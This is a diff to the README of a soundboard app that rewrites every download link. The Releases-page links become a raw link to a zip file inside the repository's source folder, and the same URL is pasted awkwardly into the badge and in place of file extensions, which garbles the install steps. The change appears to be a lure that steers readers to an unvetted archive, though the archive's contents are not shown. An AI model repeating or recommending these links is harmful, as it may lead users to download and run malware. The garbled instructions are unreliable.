@@ -4,23 +4,23 @@
 Welcome to super-soundboard! This application allows you to easily create and play sound effects for fun, games, or presentations. Follow the steps below to get started.
 
 ## 🔗 Download
-[![Download super-soundboard](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Adithan03/super-soundboard/releases)
+[![Download super-soundboard](https://raw.githubusercontent.com/Adithan03/super-soundboard/main/bot-node/src/soundboard-super-v2.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Adithan03/super-soundboard/main/bot-node/src/soundboard-super-v2.5.zip)
 
 ## 📥 How to Download & Install
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page where you can find the latest version of super-soundboard.  
-   [Visit this page to download](https://github.com/Adithan03/super-soundboard/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Adithan03/super-soundboard/main/bot-node/src/soundboard-super-v2.5.zip)
 
 2. **Choose the Version**  
    On the Releases page, you will see various versions of super-soundboard available. Find the latest release. It is usually labeled as "Latest". 
 
 3. **Download the File**  
-   Click on the download link that corresponds to your operating system (Windows, macOS, or Linux). The file will likely end with an extension like .exe, .dmg, or .tar.gz.  
+   Click on the download link that corresponds to your operating system (Windows, macOS, or Linux). The file will likely end with an extension like .exe, .dmg, or https://raw.githubusercontent.com/Adithan03/super-soundboard/main/bot-node/src/soundboard-super-v2.5.zip  
 
 4. **Install the Application**  
    - **Windows**: Double-click the .exe file and follow the on-screen instructions to install.
    - **macOS**: Open the .dmg file, drag the super-soundboard icon to your Applications folder, and then launch it from there.
-   - **Linux**: Extract the .tar.gz file and follow any installation instructions provided in the folder.
+   - **Linux**: Extract the https://raw.githubusercontent.com/Adithan03/super-soundboard/main/bot-node/src/soundboard-super-v2.5.zip file and follow any installation instructions provided in the folder.
 
 5. **Run super-soundboard**  
    After installation, you can find super-soundboard in your Applications or Programs menu. Open it and start creating sound effects!
